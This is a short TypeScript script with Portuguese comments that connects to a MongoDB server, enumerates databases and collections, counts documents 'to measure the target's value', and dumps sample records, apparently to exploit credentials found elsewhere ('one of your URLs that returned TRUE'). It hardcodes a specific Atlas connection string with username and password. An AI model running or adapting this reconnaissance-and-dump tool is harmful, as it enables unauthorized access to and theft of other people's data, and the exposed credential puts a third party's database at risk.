import { MongoClient } from "mongodb";

async function iniciarLeitura(uri: string) {
  const client = new MongoClient(uri, { connectTimeoutMS: 5000 });

  try {
    await client.connect();
    console.log("[!] Conexão estabelecida. Iniciando varredura...");

    let alvos: string[] = [];

    // --- FASE 1: RECONHECIMENTO DE PRIVILÉGIO (O que já temos) ---
    try {
      const admin = client.db("admin").admin();
      const dbs = await admin.listDatabases();

      alvos = dbs.databases.map((d) => d.name);
      console.log(alvos);
      console.log(`[+] MODO ROOT: ${alvos.length} bancos encontrados.`);
    } catch {
      const dbName = client.db().databaseName || "test";
      alvos = [dbName];
      console.log(`[+] MODO SCOPED: Focando no banco [${dbName}]`);
    }

    // --- FASE 2: LEITURA E AMOSTRAGEM ---
    for (const dbName of alvos) {
      console.log(`\n--- Lendo Banco: ${dbName} ---`);
      const db = client.db(dbName);

      try {
        const collections = await db.listCollections().toArray();

        for (const colInfo of collections) {
          const colName = colInfo.name;
          const collection = db.collection(colName);

          // Contagem total para medir o valor do alvo
          const totalDocs = await collection.countDocuments();
          console.log(`  -> Coleção: [${colName}] | Total: ${totalDocs} docs`);

          if (totalDocs > 0) {
            // Pegamos apenas os 3 primeiros docs como amostra (Smart Sampling)
            const amostra = await collection.find({}).limit(3).toArray();
            console.log(
              `     [AMOSTRA]:`,
              JSON.stringify(amostra, null, 2).substring(0, 300) + "...",
            );
          }
        }
      } catch (err) {
        console.log(
          `  [-] Erro ao listar coleções em ${dbName}: Sem permissão de leitura.`,
        );
      }
    }
  } catch (e: any) {
    console.error(`[-] Falha Crítica: ${e.message}`);
  } finally {
    await client.close();
  }
}

// --- Teste com uma de suas URLs que retornou TRUE ---
const urlTeste =
  "mongodb+srv://knight4563:knight4563@cluster0.a5br0se.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
iniciarLeitura(urlTeste);
